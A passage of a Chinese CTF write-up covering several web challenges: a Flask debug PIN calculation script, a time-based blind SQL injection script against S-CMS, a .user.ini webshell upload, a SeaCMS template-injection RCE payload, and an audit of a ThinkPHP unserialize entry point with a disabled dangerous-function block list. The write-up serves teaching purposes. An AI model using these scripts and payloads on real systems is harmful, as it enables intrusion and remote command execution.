class="line">/proc/self/cgroup</span><br><span class="line">1:name=systemd:/docker/e3690bcd5632d5f662f8ad2ce089634f784ee0d79d067fbca449b596e8120a9c</span><br><span class="line"></span><br><span class="line">/proc/sys/kernel/random/boot_id</span><br><span class="line">780aeba6-919e-4c3d-854f-e2e8936f5ab1e3690bcd5632d5f662f8ad2ce089634f784ee0d79d067fbca449b596e8120a9c </span><br></pre></td></tr></table></figure><br>还好这题有做记录不然些的会烦死。<br>计算脚本<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># username 可通过/etc/passwd获取</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376965341&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address mac地址十进制</span></span><br><span class="line">    <span class="string">&#x27;780aeba6-919e-4c3d-854f-e2e8936f5ab1b815cf6e0ea5a8d5f48354e1c70efac306a5c97591745d4be1e29d9f07c60acd&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure></p>
<h2 id="从sql到rce签到"><a href="#从sql到rce签到" class="headerlink" title="从sql到rce签到"></a>从sql到rce签到</h2><p>解题人：LSE<br>打开靶机我们先用dirseach扫一下后台我们会发现admin这个路由<br>我们点卡admin路由会发现是个登陆页面。我们尝试几个弱密码会发现为test/test<br>登陆进去为一个后台页面，我们在网上搜索CMS的sql注入的发现这一篇文章<a href="https://blog.csdn.net/solitudi/article/details/117465020?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22117465020%22%2C%22source%22%3A%22qq_14997543%22%7D&amp;fromshare=blogdetail">S_cms的sql注入</a><br>看来文章发现其成因为作者忘记对数组的输入形式进行过滤导致了sql注入漏洞。<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-1.png" class="" title="alt text"><br>跟着文章我们能找到下面这句sql语句<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">splitx</span>(<span class="variable">$x</span>, <span class="string">&quot;_&quot;</span>, <span class="number">0</span>) == <span class="string">&quot;hide&quot;</span>) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;update &quot;</span> . TABLE . <span class="string">&quot;menu set U_hide=&quot;</span> . <span class="variable">$_POST</span>[<span class="variable">$x</span>][<span class="number">0</span>] . <span class="string">&quot; where U_id=&quot;</span> . <span class="title function_ invoke__">splitx</span>(<span class="variable">$x</span>, <span class="string">&quot;_&quot;</span>, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><br>可以发现其注入点位为<code>POST[$X][]</code>$x我们可以根据这句<code>if (splitx($x, &quot;_&quot;, 0) == &quot;hide&quot;)</code>发现为hide_xxxx根据变量名我们基本可以锁定为两个隐藏按钮，我们一个一个进行尝试<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-2.png" class="" title="alt text"><br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-3.png" class="" title="alt text"><br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-4.png" class="" title="alt text"><br>尝试后会发现注入点位于菜单列表的隐藏按钮中。简单尝试一下发现只能继续时间盲注。我们直接使用盲注脚本进行注入，由于没有过滤找到注入点就可以轻松的注出数据库的内容了<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">cookies=&#123;<span class="string">&quot;authx&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;userx&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;passx&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;count_all&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;d79883b3b84f946ade345c8b8e4c6f75&quot;</span>,<span class="string">&quot;A_type&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;auth&quot;</span>:<span class="string">&quot;0%7C0%7C0%7C0%7C0%7C0%7C0%7C1%7C0%7C0%7C0%7C0%7C0&quot;</span>,<span class="string">&quot;__51vcke__JdquY3gNURaKiAFU&quot;</span>:<span class="string">&quot;d944ee39-93c6-5039-8275-52e76e2ef701&quot;</span>,<span class="string">&quot;__51vuft__JdquY3gNURaKiAFU&quot;</span>:<span class="string">&quot;1709351593670&quot;</span>,<span class="string">&quot;CmsCode&quot;</span>:<span class="string">&quot;ajov&quot;</span>,<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;a51d92610a0bb5c1a201d76e96d9904b&quot;</span>,<span class="string">&quot;__vtins__JdquY3gNURaKiAFU&quot;</span>:<span class="string">&quot;%7B%22sid%22%3A%20%22844d5f30-dc94-5dc2-b18c-702fa7ab3c38%22%2C%20%22vd%22%3A%201%2C%20%22stt%22%3A%200%2C%20%22dr%22%3A%200%2C%20%22expires%22%3A%201709438139545%2C%20%22ct%22%3A%201709436339545%7D&quot;</span>,<span class="string">&quot;__51uvsct__JdquY3gNURaKiAFU&quot;</span>:<span class="string">&quot;8&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:28149/admin/ajax.php?action=save&amp;type=menu&amp;lang=0&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;hide_41[]&quot;</span>:<span class="string">&quot;&quot;</span>&#125;<span class="comment">#这个变量是url解码后的。不解码也可以</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">150</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        payload[<span class="string">&quot;hide_41[]&quot;</span>] = <span class="string">&quot;1 and if(ascii(substr((select group_concat(A_login) from SL_admin),%d,1))&gt;%d,sleep(4),0)&quot;</span> % (i, mid)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.post(url, data=payload,cookies=cookies)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> end_time - start_time &gt; <span class="number">3</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><br>只要修改一下注入语句就可以一键注入了<br><strong>注意由于这题是在后台注入的，使用我们注入是需要带上cookie，不然无法登陆自然也无法注入了</strong><br>当我们注入出账号密码直接登陆到后台<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-5.png" class="" title="alt text"><br>会发现我们可以修改上传的文件后缀，虽然无法上传php文件但是我们可以上传ini文件上传的ini文件内容为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=muma.jpg</span><br></pre></td></tr></table></figure><br>在将一句话木马改成muma.jpg文件就可以上传成功了。之后使用蚁剑练接index.php就可以了<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-6.png" class="" title="alt text"></p>
<h2 id="ssti送分"><a href="#ssti送分" class="headerlink" title="ssti送分"></a>ssti送分</h2><p>解题人：LSE<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/ssti-1.png" class="" title="alt text"><br>我们打开靶机发现叫海洋影视那么我们可以尝试搜索海洋cms的ssti注入，会发现好的关于这个注入的文章，我这里直接贴一篇我给个人认为讲的比较详细的文章，<a href="https://blog.csdn.net/qq_41918771/article/details/103770943">seacms的ssti</a><br>我们看文章会发现这个漏洞的主要部分是模板的嵌套导致的语句拼接，导致其造成RCE，由于改了源码我们无法直接使用网上的poc<br>下面是修改的部分<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/ssti-2.png" class="" title="alt text"><br>我们可以看到其变量顺序与网上的不同使用我们修改poc的第一部分就是讲模板变量嵌套的顺序进行修改。<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/ssti-3.png" class="" title="alt text"><br>上面的语句导致了其只会提取前20个字符所有我们不仅要修改变量嵌套的顺序还要修改拼接的语句<br>我就直接丢出poc进行讲解吧<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/4.png" class="" title="alt text"><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">searchtype=<span class="number">5</span>&amp;searchword=&#123;<span class="keyword">if</span>&#123;searchpage:area&#125;&amp;area=:e&#123;searchpage:lang&#125;&#125;&amp;yuyan=<span class="title function_ invoke__">val</span>(&#123;<span class="attr">searchpage</span>:ver&#125;&amp;ver=j&#123;<span class="attr">searchpage</span>:letter&#125;&amp;letter=oin&#123;<span class="attr">searchpage</span>:jq&#125;&amp;jq=(<span class="variable">$_</span>&#123;<span class="attr">searchpage</span>:year&#125;&amp;year=POST[<span class="number">9</span>]))&amp;<span class="number">9</span>[]=sys&amp;<span class="number">9</span>[]=<span class="title function_ invoke__">tem</span>(<span class="string">&#x27;tac /f1111111111111ag&#x27;</span>);</span><br></pre></td></tr></table></figure><br>先是searchtype=5进入高级搜索可以进行模板嵌套，由于变量顺序的修改所有嵌套的顺序变为searchword-&gt;area-&gt;yuyan-&gt;ver-&gt;letter-&gt;jq-&gt;year<br>每次嵌套的语句变化为<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span>&#123;searchpage:area&#125;-&gt;&#123;<span class="keyword">if</span>:e&#123;searchpage:lang&#125;&#125;-&gt;&#123;<span class="keyword">if</span>:<span class="keyword">eval</span>(&#123;searchpage:ver&#125;&#125;-&gt;&#123;<span class="keyword">if</span>:<span class="keyword">eval</span>(j&#123;searchpage:letter&#125;&#125;-&gt;&#123;<span class="keyword">if</span>:<span class="keyword">eval</span>(join&#123;searchpage:jq&#125;&#125;-&gt;&#123;<span class="keyword">if</span>:<span class="keyword">eval</span>(<span class="title function_ invoke__">join</span>(<span class="variable">$_</span>&#123;<span class="attr">searchpage</span>:year&#125;&#125;-&gt;&#123;<span class="attr">if</span>:<span class="keyword">eval</span>(<span class="title function_ invoke__">join</span>(<span class="variable">$_POST</span>[<span class="number">9</span>]))&#125;</span><br></pre></td></tr></table></figure><br>最终会拼接为<code>&#123;if:eval(join($_POST[9]))&#125;</code>这不就是一句话木马嘛我们可以利用POST进行命令执行<br><strong>注意每个变量的字符数最多为20</strong></p>
<h2 id="CMS直接拿下"><a href="#CMS直接拿下" class="headerlink" title="CMS直接拿下"></a>CMS直接拿下</h2><p>解题人：LSE<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/thinkphp_1.png" class="" title="alt text"><br>我们可以发现其为thinkphp的6.03版本<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/thinkphp-2.png" class="" title="alt text"><br>我们上网查一下会发现其存在反序列漏洞，但是这个漏洞的前提是开发者错误的添加了应该反序列入口且反序列化的内容可控。<br>这道题目我们先进行信息收集扫描一下目录<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/cms-2.png" class="" title="alt text"><br>会发现两个比较重要的路由，分别时admin/login和www.zip(这就是泄露的源码了)<br>我们先访问www.zip下载源码，打开源码就是代码审计了<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/cms-1.png" class="" title="alt text"><br>我们先在项目中搜索unserialize会发现api.php中存在我们点开代码进行审查。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Api</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$post</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">validate</span>(<span class="title class_">User</span>::<span class="variable language_">class</span>)-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$post</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ValidateException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;账号或密码错误!&quot;</span>,<span class="string">&quot;code&quot;</span>=&gt;<span class="number">200</span>,<span class="string">&quot;url&quot;</span>=&gt;<span class="string">&quot;&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title class_">AdminUser</span>::<span class="title function_ invoke__">where</span>(<span class="string">&#x27;username&#x27;</span>,<span class="variable">$post</span>[<span class="string">&#x27;username&#x27;</span>])-&gt;<span class="title function_ invoke__">findOrEmpty</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() &amp;&amp; <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$post</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="variable">$userinfo</span> = [</span><br><span class="line">                <span class="string">&quot;id&quot;</span>=&gt;<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>],</span><br><span class="line">                <span class="string">&quot;username&quot;</span>=&gt;<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">                <span class="string">&quot;password&quot;</span>=&gt;<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>],</span><br><span class="line">            ];</span><br><span class="line">            <span class="title class_">Session</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;userinfo&#x27;</span>,<span class="variable">$userinfo</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;登陆成功!&quot;</span>,<span class="string">&quot;code&quot;</span>=&gt;<span class="number">200</span>,<span class="string">&quot;url&quot;</span>=&gt;<span class="string">&quot;/admin/index&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;账号或密码错误!&quot;</span>,<span class="string">&quot;code&quot;</span>=&gt;<span class="number">404</span>,<span class="string">&quot;url&quot;</span>=&gt;<span class="string">&quot;/admin/login&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$userinfo</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userinfo&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$userinfo</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/admin/login&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Datas</span>;</span><br><span class="line">            <span class="variable">$page</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;page&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$limit</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;limit&#x27;</span>,<span class="number">10</span>);</span><br><span class="line">            <span class="variable">$where</span> = [];</span><br><span class="line">            <span class="variable">$datas</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;serialize&#x27;</span>)-&gt;<span class="title function_ invoke__">page</span>(<span class="variable">$page</span>,<span class="variable">$limit</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">            <span class="variable">$count</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">count</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$lists</span> = [];</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$datas</span> <span class="keyword">as</span> <span class="variable">$data</span>)&#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">                <span class="variable">$lists</span>[] = [</span><br><span class="line">                    <span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$data</span>-&gt;id,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$data</span>-&gt;name,</span><br><span class="line">                    <span class="string">&quot;score1&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score1,</span><br><span class="line">                    <span class="string">&quot;score2&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score2,</span><br><span class="line">                    <span class="string">&quot;score3&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score3,</span><br><span class="line">                    <span class="string">&quot;average&quot;</span> =&gt; <span class="variable">$data</span>-&gt;average];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>, <span class="string">&quot;data&quot;</span>=&gt;<span class="variable">$lists</span>, <span class="string">&quot;count&quot;</span>=&gt;<span class="variable">$count</span>, <span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;获取成功&quot;</span>, ]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$userinfo</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userinfo&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$userinfo</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/admin/login&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;data&#x27;</span>);</span><br><span class="line">            <span class="comment">// if(preg_match(&quot;/include|include_once|require|require_once|highlight_file|fopen|readfile|fread|fgetss|fgets|parse_ini_file|show_source|flag|move_uploaded_file|file_put_contents|unlink|eval|assert|preg_replace|call_user_func|call_user_func_array|array_map|usort|uasort|uksort|array_filter|array_reduce|array_diff_uassoc|array_diff_ukey|array_udiff|array_udiff_assoc|array_udiff_uassoc|array_intersect_assoc|array_intersect_uassoc|array_uintersect|array_uintersect_assoc|array_uintersect_uassoc|array_walk|array_walk_recursive|xml_set_character_data_handler|xml_set_default_handler|xml_set_element_handler|xml_set_end_namespace_decl_handler|xml_set_external_entity_ref_handler|xml_set_notation_decl_handler|xml_set_processing_instruction_handler|xml_set_start_namespace_decl_handler|xml_set_unparsed_entity_decl_handler|stream_filter_register|set_error_handler|register_shutdown_function|register_tick_function|system|exec|shell_exec|passthru|pcntl_exec|popen|proc_open/i&quot;,$data))&#123;</span></span><br><span class="line">            <span class="comment">//     return json([&quot;code&quot;=&gt;404,&quot;msg&quot;=&gt;&quot;你想干嘛！！！&quot;]);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">//            随便吧，无所谓了，不想再编程下去了</span></span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Datas</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">save</span>([<span class="string">&#x27;serialize&#x27;</span>=&gt;<span class="variable">$data</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">200</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;修改成功&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    不想再编程下去了，直接丢一个序列化的接口，省事</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seria</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$userinfo</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userinfo&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$userinfo</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/admin/login&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$seria</span> =  <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Student</span>(</span><br><span class="line">                <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;id&#x27;</span>,<span class="number">2</span>),</span><br><span class="line">                <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;李四&#x27;</span>),</span><br><span class="line">                <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;score1&#x27;</span>,<span class="number">91</span>),</span><br><span class="line">                <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;score2&#x27;</span>,<span class="number">92</span>),</span><br><span class="line">                <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;score3&#x27;</span>,<span class="number">93</span>)</span><br><span class="line">            ));</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">200</span>, <span class="string">&quot;data&quot;</span>=&gt;<span class="variable">$seria</span>, <span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;获取成功&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">users</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">AdminUser</span>;</span><br><span class="line">        <span class="variable">$datas</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>, <span class="string">&quot;data&quot;</span>=&gt;<span class="variable">$datas</span>, <span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;获取成功&quot;</span>, ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们一步步分析会发现list函数存在unserialize的入口。下面我们来分析一下list函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$userinfo</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userinfo&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$userinfo</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/admin/login&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Datas</span>;</span><br><span class="line">            <span class="variable">$page</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;page&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$limit</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;limit&#x27;</span>,<span class="number">10</span>);</span><br><span class="line">            <span class="variable">$where</span> = [];</span><br><span class="line">            <span class="variable">$datas</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;serialize&#x27;</span>)-&gt;<span class="title function_ invoke__">page</span>(<span class="variable">$page</span>,<span class="variable">$limit</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">            <span class="variable">$count</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">count</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$lists</span> = [];</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$datas</span> <span class="keyword">as</span> <span class="variable">$data</span>)&#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>[<span 